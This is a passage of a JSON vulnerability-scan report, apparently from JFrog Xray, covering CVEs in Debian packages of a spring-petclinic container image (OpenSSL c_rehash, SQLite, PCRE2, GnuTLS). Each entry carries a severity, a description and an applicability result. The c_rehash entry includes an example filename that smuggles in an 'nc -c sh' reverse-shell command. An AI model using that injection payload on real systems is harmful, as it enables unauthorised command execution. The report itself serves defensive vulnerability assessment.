               "description": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-22T09:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209544",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper filename validation in `c_rehash` can lead to arbitrary code execution.",
            "FullDescription": "[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" > \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=blobdiff;f=tools/c_rehash.in;h=a630773a0240834476e74a7eb049a0d22729c383;hp=d51d8856d709cda39f939c1e04faeb0a31d599e6;hb=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2;hpb=7d56a74a96828985db7354a55227a511615f732b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup with PoC",
                  "Url": "https://github.com/alcaparra/CVE-2022-1292",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-1292",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable string 'c_rehash' was not found in the image",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-1292",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-83115",
         "severity": "Critical",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "SQLite3 from 3.6.0 to and including 3.27.2 is vulnerable to heap out-of-bound read in the rtreenode() function when handling invalid rtree tables.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libdb5.3",
         "source_id": "deb://debian:bullseye:libdb5.3",
         "source_comp_id": "deb://debian:bullseye:libdb5.3:5.3.28+dfsg1-0.8",
         "component_versions": {
            "id": "debian:bullseye:db5.3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-8457",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "SQLite3 from 3.6.0 to and including 3.27.2 is vulnerable to heap out-of-bound read in the rtreenode() function when handling invalid rtree tables.",
               "provider": "JFrog"
            }
         },
         "edited": "2022-11-23T20:19:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-83115",
            "VulnerabilityTitle": "",
            "ShortDescription": "SQLite3 is vulnerable to heap out-of-bounds read in the rtreenode() function when accessing malicious SQLite databases.",
            "FullDescription": "[SQLite](https://www.sqlite.org/index.html) is a very popular lightweight SQL database engine. An [R-Tree](https://en.wikipedia.org/wiki/R-tree) is a special index that is designed for doing range queries. R-Trees are most commonly used in geospatial systems where each entry is a rectangle with minimum and maximum X and Y coordinates. Given a query rectangle, an R-Tree is able to quickly find all entries that are contained within the query rectangle or which overlap the query rectangle.\n\nEven though no exploit is published, it's possible in theory to cause a heap out-of-bounds read using a crafted rtree table, leading to potential disclosure of information. The attacker would have to cause the victim to open a specially-crafted SQLite DB. In addition - the attacker would need to be familiar with the queries executed by the vicitm.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker would have to cause the victim to open a specially-crafted SQLite DB. In addition - the attacker would need to be familiar with the queries executed by the vicitm (to generate a relevant malicious SQLite DB)",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "This is memory corruption vulnerability which requires a high level of sophistication to exploit.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Writeup - Check Point",
                  "Url": "https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://www.sqlite.org/src/info/90acdbfce9c08858",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://security-tracker.debian.org/tracker/CVE-2019-8457",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libdb5.3:5.3.28+dfsg1-0.8",
            "cve_id": "CVE-2019-8457",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable SQL query 'rtreenode' was not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libdb5.3:5.3.28+dfsg1-0.8",
            "vulnerability_id": "CVE-2019-8457",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-209686",
         "severity": "Critical",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read vulnerability was discovered in the PCRE2 library in the get_recurse_data_length() function of the pcre2_jit_compile.c file. This issue affects recursions in JIT-compiled regular expressions caused by duplicate data transfers.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre2-8-0",
         "source_id": "deb://debian:bullseye:libpcre2-8-0",
         "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
         "component_versions": {
            "id": "debian:bullseye:pcre2",
            "vulnerable_versions": [
               "< 10.36-2+deb11u1"
            ],
            "fixed_versions": [
               "10.36-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1587",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.4/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "An out-of-bounds read vulnerability was discovered in the PCRE2 library in the get_recurse_data_length() function of the pcre2_jit_compile.c file. This issue affects recursions in JIT-compiled regular expressions caused by duplicate data transfers.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209686",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in the PCRE2 library leads to a denial of service when compiling attacker-controlled regular expression patterns.",
            "FullDescription": "Perl Compatible Regular Expressions 2 ([PCRE2](https://www.pcre.org/)) is a library written in C, which implements a regular expression engine, inspired by the capabilities of the Perl programming language.\nPCRE2 has its own native API, as well as a set of wrapper functions that correspond to the POSIX regular expression API.\nA number of well-known open-source programs, such as the Apache and Nginx HTTP servers, and the PHP and R scripting languages, use the PCRE library.\n\nIt was discovered that an incorrect value reading in the `get_recurse_data_length()` function of the `pcre2_jit_compile.c` file, results in an out-of-bounds read. This may lead to a denial of service.\n\nThis vulnerability is unlikely to be exploited because it requires PCRE2 to be built with the optional JIT engine enabled (the `--enable-jit` compilation flag).",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The PCRE2 library has to be compiled using the optional JIT feature which is not enabled by default. Also, it is unlikely that a regular expression pattern will be supplied from external input.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote service that uses an attacker-controlled regular expression and evaluates it using the PCRE2 library, for example with the `pcre_compile` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The fixing commit contains a PoC pattern that causes a crash",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Patch",
                  "Url": "https://github.com/PCRE2Project/pcre2/commit/03654e751e7f0700693526b67dfcadda6b42c9d0",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://bugzilla.redhat.com/show_bug.cgi?id=2077983",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC from test code",
                  "Url": "https://github.com/PCRE2Project/pcre2/commit/03654e751e7f0700693526b67dfcadda6b42c9d0#diff-bc9aac75e42a7a802c3d22be1ebdfb39b76105817cbe46689206402a1024ef64R754",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "cve_id": "CVE-2022-1587",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function pcre2_jit_compile is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "vulnerability_id": "CVE-2022-1587",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-209671",
         "severity": "Critical",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read vulnerability was discovered in the PCRE2 library in the compile_xclass_matchingpath() function of the pcre2_jit_compile.c file. This involves a unicode property matching issue in JIT-compiled regular expressions. The issue occurs because the character was not fully read in case-less matching within JIT.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre2-8-0",
         "source_id": "deb://debian:bullseye:libpcre2-8-0",
         "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
         "component_versions": {
            "id": "debian:bullseye:pcre2",
            "vulnerable_versions": [
               "< 10.36-2+deb11u1"
            ],
            "fixed_versions": [
               "10.36-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1586",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.4/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "An out-of-bounds read vulnerability was discovered in the PCRE2 library in the compile_xclass_matchingpath() function of the pcre2_jit_compile.c file. This involves a unicode property matching issue in JIT-compiled regular expressions. The issue occurs because the character was not fully read in case-less matching within JIT.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209671",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in the PCRE2 library leads to a denial of service when parsing attacker-controlled regular expressions.",
            "FullDescription": "Perl Compatible Regular Expressions 2 ([PCRE2](https://www.pcre.org/)) is a library written in C, which  implements a regular expression engine, inspired by the capabilities of the Perl programming language.\n`PCRE2` has its own native API, as well as a set of wrapper functions that correspond to the POSIX regular expression API.\nA number of well-known open-source programs, such as the `Apache` and `Nginx` HTTP servers, and the `PHP` and `R` scripting languages, use the `PCRE2` library.\n\nIt was discovered that an incorrect value reading in the `compile_xclass_matchingpath()` function of the `pcre2_jit_compile.c` file, results in an out-of-bounds read. This may lead to a denial of service.\n\nThe vulnerability involves a Unicode property matching issue in JIT-compiled regular expressions. The issue occurs because the character was not properly read in case-less matching within `JIT`.\n\nThis vulnerability is unlikely to be exploited because it requires PCRE2 to be built with the optional JIT engine enabled (the `--enable-jit` compilation flag).",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The PCRE2 library has to be compiled using the optional JIT feature which is not enabled by default. Also, it is unlikely that a regular expression pattern will be supplied from external input.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote service that uses an attacker-controlled regular expression and evaluates it using the PCRE2 library, for example with the `pcre_compile` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The fixing commit contains a PoC pattern that causes a crash",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC from test code",
                  "Url": "https://github.com/PCRE2Project/pcre2/commit/50a51cb7e67268e6ad417eb07c9de9bfea5cc55a#diff-bc9aac75e42a7a802c3d22be1ebdfb39b76105817cbe46689206402a1024ef64R418",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Patch",
                  "Url": "https://github.com/PCRE2Project/pcre2/commit/50a51cb7e67268e6ad417eb07c9de9bfea5cc55a",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://bugzilla.redhat.com/show_bug.cgi?id=2077976",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "cve_id": "CVE-2022-1586",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function pcre2_jit_compile is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "vulnerability_id": "CVE-2022-1586",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-588549",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in GnuTLS. The response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from the response times of ciphertexts with correct PKCS#1 v1.5 padding. This issue may allow a remote attacker to perform a timing side-channel attack in the RSA-PSK key exchange, potentially leading to the leakage of sensitive data. CVE-2024-0553 is designated as an incomplete resolution for CVE-2023-5981.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u5"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0553",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A vulnerability was found in GnuTLS. The response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from the response times of ciphertexts with correct PKCS#1 v1.5 padding. This issue may allow a remote attacker to perform a timing side-channel attack in the RSA-PSK key exchange, potentially leading to the leakage of sensitive data. CVE-2024-0553 is designated as an incomplete resolution for CVE-2023-5981.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-588549",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in GnuTLS may lead to RSA key brute force when attackers can cause many decryption operations.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\n- When choosing a key exchange for your server, avoid using `RSA` and instead opt for the `Diffie-Hellman` key exchange, which provides forward secrecy.\nThis can be done by generating an ECDH key using OpenSSL:\n`openssl ecparam -name prime256v1 -genkey -noout -out mykey-prime256v1.pem`\nAnd giving the filepath of the keyfile to the `gnutls_certificate_set_x509_key_file` function - \n```c\ngnutls_certificate_set_x509_key_file(res, certfile, \"mykey-prime256v1.pem\", GNUTLS_X509_FMT_PEM);\n```\n\n- When using `RSA` for key exchange, use the `OAEP` padding scheme instead of `PKCS#1 v1.5`.\n\n- When using `RSA` and `PKCS#1` for key exchange, avoid informing the client of decryption failure.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "This CVE is only exploitable when all of the following conditions are met:\n\n1. The server must use `RSA` for key exchange.\n2. The server encrypts/decrypts `RSA` with `PKCS#1 v1.5` padding.\n3. The server informs the client when decryption fails.\n4. An attacker is on the same subnet, hijacks a session between the client and the server and manipulates the client data.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability does not rely on timing to exploit, but rather on the server informing the client that decryption failed, hence it can be exploited remotely, completely disregarding latency issues.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not take the context required to exploit the vulnerability into account.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "A successful attack would compromise the server's private RSA key, allowing the attacker to decrypt any sniffed TLS traffic sent to or from the server from any host.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although Bleichenbacher's Attack is well documented today, a high technical understanding of cryptography is required to exploit it.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Other",
                  "Title": "Attack Research Paper",
                  "Url": "https://drive.google.com/viewerng/viewer?url=http://archiv.infsec.ethz.ch/education/fs08/secsem/Bleichenbacher98.pdf",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "GnuTLS GitLab Issue",
                  "Url": "https://gitlab.com/gnutls/gnutls/-/issues/1522",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "cve_id": "CVE-2024-0553",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "vulnerability_id": "CVE-2024-0553",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416941",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A timing side-channel in the handling of RSA ClientKeyExchange messages was discovered in GnuTLS. This side-channel can be sufficient to recover the key encrypted in the RSA ciphertext across a network in a Bleichenbacher style attack. To achieve a successful decryption the attacker would need to send a large amount of specially crafted messages to the vulnerable server. By recovering the secret from the ClientKeyExchange message, the attacker would be able to decrypt the application data exchanged over that connection.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u3"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0361",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                  }
               ],
               "description": "A timing side-channel in the handling of RSA ClientKeyExchange messages was discovered in GnuTLS. This side-channel can be sufficient to recover the key encrypted in the RSA ciphertext across a network in a Bleichenbacher style attack. To achieve a successful decryption the attacker would need to send a large amount of specially crafted messages to the vulnerable server. By recovering the secret from the ClientKeyExchange message, the attacker would be able to decrypt the application data exchanged over that connection.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-11T13:04:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416941",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in GnuTLS may lead to RSA key brute force when attackers can cause many decryption operations.",
